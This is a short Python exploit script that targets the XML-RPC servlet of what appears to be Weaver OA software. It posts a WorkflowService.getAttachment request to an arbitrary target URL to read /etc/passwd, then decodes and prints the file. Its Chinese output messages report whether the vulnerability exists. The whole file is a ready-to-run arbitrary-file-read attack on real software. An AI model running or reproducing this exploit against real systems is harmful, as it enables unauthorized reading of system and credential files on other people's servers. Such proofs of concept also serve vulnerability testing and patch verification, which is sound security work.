#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import base64
import requests
import urllib3
import sys
import json
import re


regular = "<base64>([^<]+)</base64>"

def verify(site):
    burp0_url = site + "/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet"
    burp0_headers = {"Content-Type": "application/xml"}
    burp0_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall>\r\n<methodName>WorkflowService.getAttachment</methodName>\r\n<params><param><value><string>/etc/passwd</string>\r\n</value></param></params></methodCall>"
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    info = re.findall(regular, r.text)
    if len(info) != 0:
        return base64.b64decode(info[0])
    else:
        return ""


if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取 /etc/passwd 的内容为：", info)
    else:
        print("[-]漏洞不存在")
